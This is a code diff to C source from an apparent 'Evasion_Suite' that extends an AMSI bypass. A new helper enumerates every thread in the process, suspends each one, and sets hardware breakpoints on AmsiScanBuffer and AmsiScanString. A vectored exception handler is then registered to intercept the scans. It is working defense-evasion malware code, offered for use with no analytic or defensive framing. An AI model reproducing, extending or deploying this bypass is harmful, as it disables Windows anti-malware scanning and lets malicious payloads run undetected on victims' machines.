@@ -23,9 +23,38 @@
 
 #include "../Evasion_Suite/include/common.h"
 #include "../Evasion_Suite/include/indirect_syscall.h"
+#include <tlhelp32.h>
 
-// Forward declaration to resolve top-to-bottom compilation error
+/* Forward Declaration */
 BOOL RegisterAMSIDllWatch(void);
+
+/* Helper to apply our HWBPs to all existing threads */
+static BOOL ApplyBreakpointsToAllThreads() {
+    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+    if (hSnapshot == INVALID_HANDLE_VALUE) return FALSE;
+
+    THREADENTRY32 te32;
+    te32.dwSize = sizeof(THREADENTRY32);
+    DWORD currentPID = GetCurrentProcessId();
+
+    if (Thread32First(hSnapshot, &te32)) {
+        do {
+            /* Only target threads inside our host process */
+            if (te32.th32OwnerProcessID == currentPID) {
+                HANDLE hThread = OpenThread(THREAD_SET_CONTEXT | THREAD_GET_CONTEXT | THREAD_SUSPEND_RESUME, FALSE, te32.th32ThreadID);
+                if (hThread) {
+                    SuspendThread(hThread); // Must suspend to change Context reliably
+                    if (s_pAmsiScanBuffer) SetHardwareBreakpoint(hThread, s_pAmsiScanBuffer, 0);
+                    if (s_pAmsiScanString) SetHardwareBreakpoint(hThread, s_pAmsiScanString, 1);
+                    ResumeThread(hThread);
+                    CloseHandle(hThread);
+                }
+            }
+        } while (Thread32Next(hSnapshot, &te32));
+    }
+    CloseHandle(hSnapshot);
+    return TRUE;
+}
 
 /*---------------------------------------------------------------------------
  *  AMSI result codes
@@ -234,17 +263,8 @@ BOOL InstallAMSIBypass(void) {
 
         if (!s_pAmsiScanBuffer) return FALSE;
 
-        /* Set hardware breakpoints via indirect syscalls */
-        HANDLE hThread = GetCurrentThread();
-
-        if (!SetHardwareBreakpoint(hThread, s_pAmsiScanBuffer, 0)) {
-            return FALSE;
-        }
-
-        if (s_pAmsiScanString) {
-            SetHardwareBreakpoint(hThread, s_pAmsiScanString, 1);
-            /* Not fatal if this fails — ScanBuffer is the critical one */
-        }
+        /* Set Hardware Breakpoints on all threads. */
+        ApplyBreakpointsToAllThreads();
 
         /* Register VEH — first handler (catches before any SEH) */
         s_hVEH = AddVectoredExceptionHandler(1, VEH_AMSIHandler);
@@ -324,13 +344,9 @@ static VOID NTAPI DllLoadCallback(
         s_pAmsiScanBuffer = GetExportByHash(Data->DllBase, HASH_AmsiScanBuffer);
         s_pAmsiScanString = GetExportByHash(Data->DllBase, HASH_AmsiScanString);
 
-        HANDLE hThread = GetCurrentThread();
-
         if (s_pAmsiScanBuffer) {
-            SetHardwareBreakpoint(hThread, s_pAmsiScanBuffer, 0);
-        }
-        if (s_pAmsiScanString) {
-            SetHardwareBreakpoint(hThread, s_pAmsiScanString, 1);
+            /* Set Hardware Breakpoints on all threads (the God-Tier Patch) */
+            ApplyBreakpointsToAllThreads();
         }
     }
 }
